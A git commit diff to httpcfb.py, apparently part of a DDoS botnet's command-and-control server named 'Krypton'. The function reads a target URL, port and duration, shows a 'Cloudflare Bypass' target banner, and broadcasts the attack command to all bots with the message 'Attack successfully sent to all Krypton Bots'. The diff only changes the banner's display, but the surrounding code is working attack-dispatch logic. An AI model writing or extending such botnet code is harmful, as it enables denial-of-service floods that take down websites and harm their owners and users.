6cf03eb7fd9cbd5eba965f57caf547971f6b8a84
cirqueira <118860604+CirqueiraDev@users.noreply.github.com>
2024-01-22 16:13:19 -0300

    Update httpcfb.py

--- src/Commands/Methods_L7/httpcfb.py
+++ src/Commands/Methods_L7/httpcfb.py
@@ -5,8 +5,17 @@ def httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data):
         url = args[1]
         port = args[2]
         secs = args[3]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s URL:%s %s
+            %sPORT:%s %s
+            %sTIME:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, port, Fore.CYAN, Fore.LIGHTWHITE_EX, secs,Fore.CYAN, Fore.LIGHTWHITE_EX, 'Cloudflare Bypass')
+
         if validate_time(secs):
-            send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
+            for x in xxxx.split('\n'):
+                send(client, '\x1b[3;31;40m'+ x)
+            send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
             broadcast(data)
         else:
             send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
